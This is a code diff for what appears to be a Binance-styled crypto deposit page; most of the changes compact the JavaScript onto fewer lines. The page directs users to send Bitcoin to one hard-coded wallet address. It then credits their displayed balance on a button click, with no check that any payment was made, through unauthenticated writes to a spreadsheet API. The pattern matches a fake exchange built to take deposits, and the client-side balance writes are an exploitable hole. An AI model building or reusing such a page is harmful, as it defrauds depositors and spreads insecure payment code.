-            const step2Label = document.getElementById('step2Label');
-            const step3Label = document.getElementById('step3Label');
-
-            [step1Dot, step2Dot, step3Dot].forEach(dot => {
-                dot.classList.remove('step-completed', 'step-active');
-                dot.classList.add('step-inactive');
-                dot.innerHTML = dot === step1Dot ? '<i class="fas fa-check text-white text-xs"></i>' : 
-                               dot === step2Dot ? '2' : '3';
-            });
-            [step1Label, step2Label, step3Label].forEach(label => {
-                label.classList.remove('text-gray-900', 'text-blue-600', 'text-emerald-600');
-                label.classList.add('text-gray-400');
-            });
-
-            if (step >= 1) {
-                step1Dot.classList.remove('step-inactive');
-                step1Dot.classList.add('step-completed');
-                step1Label.classList.remove('text-gray-400');
-                step1Label.classList.add('text-emerald-600');
-            }
-            if (step >= 2) {
-                step2Dot.classList.remove('step-inactive');
-                step2Dot.classList.add('step-active');
-                step2Label.classList.remove('text-gray-400');
-                step2Label.classList.add('text-blue-600');
-            }
-            if (step >= 3) {
-                step3Dot.classList.remove('step-inactive');
-                step3Dot.classList.add('step-active');
-                step3Label.classList.remove('text-gray-400');
-                step3Label.classList.add('text-blue-600');
-            }
+            const step1Dot = document.getElementById('step1Dot'), step2Dot = document.getElementById('step2Dot'), step3Dot = document.getElementById('step3Dot');
+            const step1Label = document.getElementById('step1Label'), step2Label = document.getElementById('step2Label'), step3Label = document.getElementById('step3Label');
+            [step1Dot, step2Dot, step3Dot].forEach(dot => { dot.classList.remove('step-completed', 'step-active'); dot.classList.add('step-inactive'); dot.innerHTML = dot === step1Dot ? '<i class="fas fa-check text-white text-xs"></i>' : dot === step2Dot ? '2' : '3'; });
+            [step1Label, step2Label, step3Label].forEach(label => { label.classList.remove('text-gray-900', 'text-blue-600', 'text-emerald-600'); label.classList.add('text-gray-400'); });
+            if (step >= 1) { step1Dot.classList.remove('step-inactive'); step1Dot.classList.add('step-completed'); step1Label.classList.remove('text-gray-400'); step1Label.classList.add('text-emerald-600'); }
+            if (step >= 2) { step2Dot.classList.remove('step-inactive'); step2Dot.classList.add('step-active'); step2Label.classList.remove('text-gray-400'); step2Label.classList.add('text-blue-600'); }
+            if (step >= 3) { step3Dot.classList.remove('step-inactive'); step3Dot.classList.add('step-active'); step3Label.classList.remove('text-gray-400'); step3Label.classList.add('text-blue-600'); }
         }
 
-        // Select payment method with loading animation
         function selectMethodWithLoading(method) {
             if (isProcessing) return;
             currentMethod = method;
-            
-            document.querySelectorAll('.method-card').forEach(card => {
-                card.classList.remove('active');
-            });
+            document.querySelectorAll('.method-card').forEach(card => card.classList.remove('active'));
             document.getElementById(`method-${method}`).classList.add('active');
-            
-            if (method === 'crypto') {
-                showLoadingAnimation(() => {
-                    goToAmountPage();
-                });
-            }
+            if (method === 'crypto') showLoadingAnimation(() => goToAmountPage());
         }
 
-        function goToAmountPage() {
-            step1Container.style.display = 'none';
-            step2Container.style.display = 'block';
-            step3Container.style.display = 'none';
-            updateSteps(2);
-        }
+        function goToAmountPage() { step1Container.style.display = 'none'; step2Container.style.display = 'block'; step3Container.style.display = 'none'; updateSteps(2); }
+        function backToMethodsWithLoading() { showLoadingAnimation(() => backToMethods()); }
+        function backToMethods() { step1Container.style.display = 'block'; step2Container.style.display = 'none'; step3Container.style.display = 'none'; updateSteps(1); }
+        function backToAmountWithLoading() { showLoadingAnimation(() => backToAmount()); }
+        function backToAmount() { step1Container.style.display = 'none'; step2Container.style.display = 'block'; step3Container.style.display = 'none'; updateSteps(2); }
 
-        function backToMethodsWithLoading() {
-            showLoadingAnimation(() => {
-                backToMethods();
-            });
-        }
-
-        function backToMethods() {
-            step1Container.style.display = 'block';
-            step2Container.style.display = 'none';
-            step3Container.style.display = 'none';
-            updateSteps(1);
-        }
-
-        function backToAmountWithLoading() {
-            showLoadingAnimation(() => {
-                backToAmount();
-            });
-        }
-
-        function backToAmount() {
-            step1Container.style.display = 'none';
-            step2Container.style.display = 'block';
-            step3Container.style.display = 'none';
-            updateSteps(2);
-        }
-
-        // Get raw amount value from input
         function getRawAmountValue() {
             let rawValue = amountInput.value.trim();
-            if (rawValue === '' || rawValue === '-') {
-                return null;
-            }
+            if (rawValue === '' || rawValue === '-') return null;
             let cleaned = rawValue.replace(/[^0-9.]/g, '');
             if (cleaned === '') return null;
-            
             let parts = cleaned.split('.');
-            if (parts.length > 2) {
-                cleaned = parts[0] + '.' + parts.slice(1).join('');
-            }
-            
+            if (parts.length > 2) cleaned = parts[0] + '.' + parts.slice(1).join('');
             let num = parseFloat(cleaned);
             if (isNaN(num)) return null;
-            
             return Math.round(num * 100) / 100;
         }
 
-        // Update display only
         function updateDisplayOnly() {
             let num = getRawAmountValue();
-            if (num === null) {
-                subtotalDisplay.innerText = '$0.00';
-                totalDisplay.innerText = '$0.00';
-                return false;
-            }
-            
+            if (num === null) { subtotalDisplay.innerText = '$0.00'; totalDisplay.innerText = '$0.00'; return false; }
             const formatted = num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            subtotalDisplay.innerText = `$${formatted}`;
-            totalDisplay.innerText = `$${formatted}`;
-            
-            if (num < 10) {
-                amountError.textContent = 'Minimum amount is $10';
-                amountError.classList.remove('hidden');
-                return false;
-            } else if (num > 10000) {
-                amountError.textContent = 'Maximum amount is $10,000';
-                amountError.classList.remove('hidden');
-                return false;
-            } else {
-                amountError.classList.add('hidden');
-                return true;
-            }
+            subtotalDisplay.innerText = `$${formatted}`; totalDisplay.innerText = `$${formatted}`;
+            if (num < 10) { amountError.textContent = 'Minimum amount is $10'; amountError.classList.remove('hidden'); return false; }
+            else if (num > 10000) { amountError.textContent = 'Maximum amount is $10,000'; amountError.classList.remove('hidden'); return false; }
+            else { amountError.classList.add('hidden'); return true; }
         }
 
-        // Set preset amount
         function setPresetAmount(value) {
             amountInput.value = value.toFixed(2);
             updateDisplayOnly();
-            
-            [50, 100, 250, 500].forEach(p => {
-                const btn = document.getElementById(`preset-${p}`);
-                if (btn) {
-                    if (Math.abs(p - value) < 0.01) {
-                        btn.className = 'preset-btn preset-btn-active py-3 rounded-xl text-sm font-semibold';
-                    } else {
-                        btn.className = 'preset-btn py-3 rounded-xl text-sm font-semibold';
-                    }
-                }
-            });
+            [50, 100, 250, 500].forEach(p => { const btn = document.getElementById(`preset-${p}`); if (btn) { if (Math.abs(p - value) < 0.01) btn.className = 'preset-btn preset-btn-active py-3 rounded-xl text-sm font-semibold'; else btn.className = 'preset-btn py-3 rounded-xl text-sm font-semibold'; } });
         }
 
-        // Real-time input handling
-        amountInput.addEventListener('input', (e) => {
-            updateDisplayOnly();
-        });
+        amountInput.addEventListener('input', (e) => updateDisplayOnly());
 
-        // Go to Bitcoin payment with loading animation
         function goToBitcoinPaymentWithLoading() {
             let amount = getRawAmountValue();
-            
-            if (amount === null) {
-                amountError.textContent = 'Please enter a valid amount';
-                amountError.classList.remove('hidden');
-                return;
-            }
-            
-            if (amount < 10) {
-                amountError.textContent = 'Minimum amount is $10';
-                amountError.classList.remove('hidden');
-                return;
-            }
-            
-            if (amount > 10000) {
-                amountError.textContent = 'Maximum amount is $10,000';
-                amountError.classList.remove('hidden');
-                return;
-            }
-            
-            amountError.classList.add('hidden');
-            currentAmount = amount;
-            
-            showLoadingAnimation(() => {
-                goToBitcoinPayment();
-            });
+            if (amount === null) { amountError.textContent = 'Please enter a valid amount'; amountError.classList.remove('hidden'); return; }
+            if (amount < 10) { amountError.textContent = 'Minimum amount is $10'; amountError.classList.remove('hidden'); return; }
+            if (amount > 10000) { amountError.textContent = 'Maximum amount is $10,000'; amountError.classList.remove('hidden'); return; }
+            amountError.classList.add('hidden'); currentAmount = amount;
+            showLoadingAnimation(() => goToBitcoinPayment());
         }
 
         function goToBitcoinPayment() {
             const formattedAmount = `$${currentAmount.toFixed(2)}`;
             document.getElementById('btcAmountDisplay').innerText = formattedAmount;
             document.getElementById('instructionAmount').innerText = formattedAmount;
-            
-            step1Container.style.display = 'none';
-            step2Container.style.display = 'none';
-            step3Container.style.display = 'block';
-            updateSteps(3);
+            step1Container.style.display = 'none'; step2Container.style.display = 'none'; step3Container.style.display = 'block'; updateSteps(3);
         }
 
-        // Copy Bitcoin Address
         function copyBitcoinAddress() {
             const address = "bc1qqgy9uf9uzqu4c85kdnqkn7vlurwwqjxmwa4wcp";
-            navigator.clipboard.writeText(address).then(() => {
-                const btnText = document.getElementById('copyBtnText');
-                btnText.innerHTML = '<i class="fas fa-check"></i> Copied!';
-                setTimeout(() => {
-                    btnText.innerHTML = '<i class="far fa-copy"></i> Copy wallet address';
-                }, 2000);
-            });
+            navigator.clipboard.writeText(address).then(() => { const btnText = document.getElementById('copyBtnText'); btnText.innerHTML = '<i class="fas fa-check"></i> Copied!'; setTimeout(() => btnText.innerHTML = '<i class="far fa-copy"></i> Copy wallet address', 2000); });
         }
-        
-        // Fetch user balance from database
-        async function fetchUserBalance() {
+
+        // Same balance fetching as dashboard.html
+        async function fetchUserData() {
             const savedEmail = localStorage.getItem('binance_session_email');
             if (!savedEmail) {
                 window.location.href = 'index.html';
-                return 0;
+                return null;
             }
-            
             currentUserEmail = savedEmail;
-            
             try {
                 const response = await fetch(`${API_URL}?ignore_cache=1`);
                 const users = await response.json();
                 const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
-                
                 if (user) {
                     currentUserBalance = parseFloat(user.Balance) || 0;
                     const balanceInDollars = (currentUserBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-                    if (currentBalanceDisplay) {
-                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
-                    }
-                    return currentUserBalance;
+                    if (currentBalanceDisplay) currentBalanceDisplay.innerText = `$${balanceInDollars}`;
                 }
-                return 0;
-            } catch (error) {
-                console.error('Error fetching user balance:', error);
-                return 0;
-            }
+                return user;
+            } catch (error) { console.error('Error fetching user data:', error); return null; }
         }
-        
-        // Update user balance in database
+
         async function updateUserBalance(amountInCents) {
             if (!currentUserEmail) return false;
-            
             const newBalance = currentUserBalance + amountInCents;
-            
             try {
                 const response = await fetch(`${API_URL}?ignore_cache=1`);
                 const users = await response.json();
                 const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase());
-                
                 if (userIndex === -1) return false;
-                
                 const rowNumber = userIndex + 2;
-                const updateResponse = await fetch(`${API_URL}/${rowNumber}`, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ Balance: newBalance })
-                });
-                
+                const updateResponse = await fetch(`${API_URL}/${rowNumber}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ Balance: newBalance }) });
                 if (updateResponse.ok) {
                     currentUserBalance = newBalance;
                     const balanceInDollars = (newBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-                    if (currentBalanceDisplay) {
-                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
-                    }
+                    if (currentBalanceDisplay) currentBalanceDisplay.innerText = `$${balanceInDollars}`;
                     return true;
                 }
                 return false;
-            } catch (error) {
-                console.error('Error updating balance:', error);
-                return false;
-            }
+            } catch (error) { console.error('Error updating balance:', error); return false; }
         }
-        
-        // Save transaction to Transactions sheet
+
         async function saveTransaction(amountInCents) {
             if (!currentUserEmail) return;
-            
             const sign = amountInCents >= 0 ? '+' : '';
             const transactionValue = `${sign}${amountInCents}`;
-            
-            try {
-                await fetch(TRANSACTIONS_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify([{ Email: currentUserEmail, Amount: transactionValue }])
-                });
-                console.log('Transaction saved:', transactionValue);
-            } catch (error) {
-                console.error('Failed to save transaction:', error);
-            }
+            try { await fetch(TRANSACTIONS_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify([{ Email: currentUserEmail, Amount: transactionValue }]) }); console.log('Transaction saved:', transactionValue); } 
+            catch (error) { console.error('Failed to save transaction:', error); }
         }
-        
-        // Confirm payment and update balance
+
         async function confirmPayment() {
             const depositAmountInCents = Math.round(currentAmount * 100);
-            
             const confirmModal = document.getElementById('confirmModal');
             const confirmProgressFill = document.getElementById('confirmProgressFill');
             confirmModal.classList.add('active');
             confirmProgressFill.style.width = '0%';
-            
             let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 10;
-                confirmProgressFill.style.width = `${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                }
-            }, 200);
-            
+            const progressInterval = setInterval(() => { progress += 10; confirmProgressFill.style.width = `${progress}%`; if (progress >= 100) clearInterval(progressInterval); }, 200);
             const success = await updateUserBalance(depositAmountInCents);
-            
-            if (success) {
-                await saveTransaction(depositAmountInCents);
-                setTimeout(() => {
-                    confirmModal.classList.remove('active');
-                    window.location.href = 'dashboard.html';
-                }, 1500);
-            } else {
-                clearInterval(progressInterval);
-                confirmModal.classList.remove('active');
-                alert('Payment confirmation failed. Please contact support.');
-            }
+            if (success) { await saveTransaction(depositAmountInCents); setTimeout(() => { confirmModal.classList.remove('active'); window.location.href = 'dashboard.html'; }, 1500); } 
+            else { clearInterval(progressInterval); confirmModal.classList.remove('active'); alert('Payment confirmation failed. Please contact support.'); }
         }
 
-        // Initialize
         async function init() {
-            await fetchUserBalance();
+            await fetchUserData();
             updateSteps(1);
             updateDisplayOnly();
             setPresetAmount(250);
         }
-        
         init();
     </script>
 </body>
